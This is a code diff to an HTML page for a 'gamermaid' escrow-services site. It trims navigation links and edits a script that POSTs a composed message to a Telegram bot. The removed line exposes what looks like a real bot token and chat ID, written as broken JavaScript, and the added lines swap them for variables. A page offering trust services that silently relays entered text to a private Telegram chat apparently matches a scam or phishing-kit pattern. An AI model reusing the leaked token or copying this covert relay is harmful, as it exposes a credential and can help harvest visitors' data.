@@ -586,15 +586,14 @@
     <header class="header">
         <div class="container">
             <nav class="navbar">
-                <a href="index.html" class="logo">
+                <a href="#" class="logo">
                     <div class="logo-icon">
                         <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
                     </div>
                     <span class="logo-text">gamermaid</span>
                 </a>
                 <div class="nav-desktop">
-                    <a href="index.html" class="nav-link">Home</a>
-                    <a href="escrow.html" class="nav-link" style="color:var(--text-primary); font-weight:600;">Escrow Services</a>
+                    <a href="#" class="nav-link" style="color:var(--text-primary); font-weight:600;">Escrow Services</a>
                 </div>
                 <div class="nav-actions">
                     <a href="#" class="btn-signin">Sign In</a>
@@ -825,11 +824,11 @@
                 `.trim();
 
                 try {
-                    await fetch(`https://api.telegram.org/bot${9110476686:AAEWur5sDsKFeD6SFLcXMnleLfw57_F-5RY}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: 9110476686,
+                            chat_id: CHAT_ID,
                             text: message
                         })
                     });
